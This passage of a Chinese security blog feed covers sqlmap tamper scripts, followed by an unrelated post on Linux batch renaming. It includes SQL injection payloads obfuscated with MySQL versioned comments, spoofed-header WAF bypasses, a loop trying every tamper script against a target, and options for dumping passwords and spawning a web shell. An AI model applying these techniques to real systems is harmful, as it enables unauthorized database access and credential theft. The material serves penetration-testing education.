SELECT</code></pre><p><strong>适用数据库：</strong>ALL</p><p>varnish.py： </p><pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;return payload</code></pre><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><pre><code>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</code></pre><p><strong>适用数据库：</strong>ALL</p><p>versionedkeywords.py </p><p>对不是函数的关键字进行注释</p><pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</code></pre><p>to</p><pre><code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>versionedmorekeywords.py： </p><p>注释每个关键字</p><pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</code></pre><p>to</p><pre><code>1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))#</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><p>xforwardedfor.py： </p><pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;] = randomIP()return payload</code></pre><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p><p><strong>自动尝试每个tamper脚本</strong><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `<span class="keyword">ls</span> <span class="string">/usr/share/sqlmap/tamper/</span>*<span class="string">.py</span>`; do <span class="keyword">echo</span> -e <span class="string">"\e[41;1m  tamper: $t\e[0m"</span>; sqlmap -u <span class="string">"http://target.com/sql.asp?id=xx*"</span> <span class="params">--dbs</span> <span class="params">--random-agent</span> <span class="params">--smart</span> <span class="params">--batch</span> <span class="params">--tamper</span> $t <span class="params">--threads</span> 10;done;</span><br></pre></td></tr></table></figure></p><p><strong>说明下 :</strong></p><p>–random-agent 参数随机 random-agent  (可绕过一些检测) 当然此时也可以不要该参数<br>–smart 智能的方式<br>–batch 默认选择<br>echo -e “\e[41;1m  tamper: $t\e[0m”;  是为了 显眼的方式 显示 当前使用的 tamper 红底白字 加粗…  以方便找到合适tamper 然后停止。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.sina.com.cn/s/blog_6b347b2a0101379o.html" target="_blank" rel="noopener">Cookie SQL注入</a><br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmapproject/sqlmap</a><br><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">sql_injection knowledge base</a><br><a href="http://sqlwiki.radare.cn/#/" target="_blank" rel="noopener">sql注入wiki</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-安装&quot;&gt;&lt;a href=&quot;#0x00-安装&quot; class=&quot;headerlink&quot; title=&quot;0x00 安装&quot;&gt;&lt;/a&gt;0x00 安装&lt;/h2&gt;&lt;p&gt;git clone &lt;a href=&quot;https://github.com/sqlmapproject/sqlmap.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/sqlmapproject/sqlmap.git&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-基本用法&quot;&gt;&lt;a href=&quot;#0x01-基本用法&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本用法&quot;&gt;&lt;/a&gt;0x01 基本用法&lt;/h2&gt;&lt;h3 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数&quot;&gt;&lt;/a&gt;常用参数&lt;/h3&gt;&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-dbs       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--count&lt;/span&gt; -D “数据库”   &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;获取表中数据个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-db&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--passwords&lt;/span&gt;              &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-user&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--privileges&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;查看权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--os-shell&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;写web shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--is-dba&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;判断当前用户是不是dba&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--tables&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;          &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库的表名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--columns&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt; 列举列名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--dump&lt;/span&gt; -C &lt;span class=&quot;string&quot;&gt;&quot;列名&quot;&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--start=&lt;/span&gt;：指定开始的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--stop=&lt;/span&gt;：指定结束的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--threads=&lt;/span&gt;:线程数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;存储数据在 &lt;span class=&quot;string&quot;&gt;./sqlmap/output/.......&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-f &lt;span class=&quot;params&quot;&gt;--banner&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--dbs&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--crawl=3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为2以上，会尝试注入cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为3以上，会尝试注入user-agent、referer&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux下批量重命名rename</title>
    <link href="http://www.pa55w0rd.club/rename-linux/"/>
    <id>http://www.pa55w0rd.club/rename-linux/</id>
    <published>2018-11-22T07:53:44.000Z</published>
    <updated>2018-11-22T08:08:30.961Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统：Ubuntu</p><h2 id="安装rename"><a href="#安装rename" class="headerlink" title="安装rename"></a>安装rename</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install rename -y</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>-n：打印效果但不执行</p></li><li><p>-v：执行修改并打印结果</p></li><li><p>s：替换，支持正则表达式</p></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>替换文件名中的字符串，将test1替换为test2</p><p> renema -v ‘s/test1/test2’ *.md</p></li><li><p>去掉文件名中的日期，格式2018-10-10</p><p> rename -v ‘s/\d{4}-\d{2}-\d{2}//‘ *.md  </p></li><li><p>去掉文件后缀名.bak</p><p> rename ‘s/.bak$//‘ *.bak</p></li><li><p>去掉文件名中的空格</p><p> rename ‘s/[ ]+//g’ *</p></li><li><p>在文件开头加入字符串test1</p><p> rename ‘s/^/test1/‘ *</p></li><li><p>在文件结尾加入字符串</p><p> rename ‘s/$/test1/‘ *</p></li><li><p>替换文件名中的大小写</p><p> rename -v ‘y/A-Z/a-z/‘ *</p></li></ol><p><strong><a href="http://tool.oschina.net/regex/#" target="_blank" rel="noopener">在线正则表达式测试</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统：Ubuntu&lt;/p&gt;
&lt;h2 id=&quot;安装rename&quot;&gt;&lt;a href=&quot;#安装rename&quot; class=&quot;headerlink&quot; title=&quot;安装rename&quot;&gt;&lt;/a&gt;安装rename&lt;/h2&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# apt-get install rename -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
</feed>
